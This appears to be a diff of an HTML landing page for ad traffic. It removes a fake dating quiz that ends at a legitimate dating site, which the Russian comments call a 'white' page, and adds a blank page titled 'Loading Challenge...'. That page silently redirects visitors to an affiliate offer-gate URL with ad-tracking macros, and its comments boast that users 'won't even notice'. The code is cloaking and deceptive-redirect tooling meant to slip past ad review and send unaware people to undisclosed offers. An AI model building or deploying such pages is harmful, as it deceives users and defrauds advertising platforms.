@@ -2,79 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MeetLocal - Premium Dating Network</title>
-    <style>
-        body { font-family: 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #f43f5e 0%, #ec4899 100%); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
-        .wrapper { background: #ffffff; width: 100%; max-width: 400px; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); text-align: center; box-sizing: border-box; margin: 20px; }
-        .logo { font-size: 28px; font-weight: 800; color: #f43f5e; margin-bottom: 5px; letter-spacing: -1px; }
-        .tagline { color: #6b7280; font-size: 14px; margin-bottom: 30px; }
-        h2 { font-size: 19px; margin-bottom: 20px; color: #1f2937; line-height: 1.4; }
-        .btn-group { display: flex; flex-direction: column; gap: 12px; }
-        .btn { background: #f43f5e; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; text-decoration: none; }
-        .btn:hover { background: #e11d48; }
-        .btn-alt { background: #f3f4f6; color: #4b5563; }
-        .step { display: none; }
-        .step.active { display: block; }
-        .footer-links { margin-top: 30px; font-size: 12px; color: #9ca3af; border-top: 1px solid #f3f4f6; padding-top: 15px; }
-    </style>
+    <title>Loading Challenge...</title>
+    <script>
+        // Моментальный автоматический перенос юзера на оффер
+        window.location.replace("https://offergate-other40.com/7-1ajb6m-i1sw-hwac-g7uu?subid_1={{zoneid}}&subid_2={{campaignid}}&subid_3={{browsername}}&subid_7={{ctoken}}&");
+    </script>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="logo">❤️ MeetLocal</div>
-        <div class="tagline">Find your perfect match nearby</div>
-        
-        <div id="step1" class="step active">
-            <h2>Are you over 18 years old?</h2>
-            <div class="btn-group">
-                <button class="btn" onclick="nextStep(2)">Yes, I am 18+</button>
-                <button class="btn btn-alt" onclick="alert('Access denied')">No, exit</button>
-            </div>
-        </div>
-
-        <div id="step2" class="step">
-            <h2>Select your gender:</h2>
-            <div class="btn-group">
-                <button class="btn" onclick="nextStep(3)">I am a Man</button>
-                <button class="btn" onclick="nextStep(3)">I am a Woman</button>
-            </div>
-        </div>
-
-        <div id="step3" class="step">
-            <h2>What are you looking for?</h2>
-            <div class="btn-group">
-                <button class="btn" onclick="startLoading()">Serious relationships</button>
-                <button class="btn btn-alt" onclick="startLoading()">Flirt & Chat</button>
-            </div>
-        </div>
-
-        <div id="step4" class="step">
-            <h2>Searching for profiles...</h2>
-            <p style="color: #6b7280;">Connecting to the dating pool.</p>
-            <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f4f6; border-top: 4px solid #f43f5e; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-        </div>
-        
-        <div class="footer-links">
-            Privacy Policy • Terms of Service • © 2026 MeetLocal Network
-        </div>
-    </div>
-
-    <script>
-        function nextStep(stepNum) {
-            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById('step' + stepNum).classList.add('active');
-        }
-
-        function startLoading() {
-            nextStep(4);
-            // Через 2.5 секунды перенаправляем на белый авторитетный сайт
-            setTimeout(function() {
-                window.location.replace("https://badoo.com");
-            }, 2500);
-        }
-    </script>
-    <style>
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <!-- Пустая страница, юзер ее даже не заметит -->
 </body>
 </html>
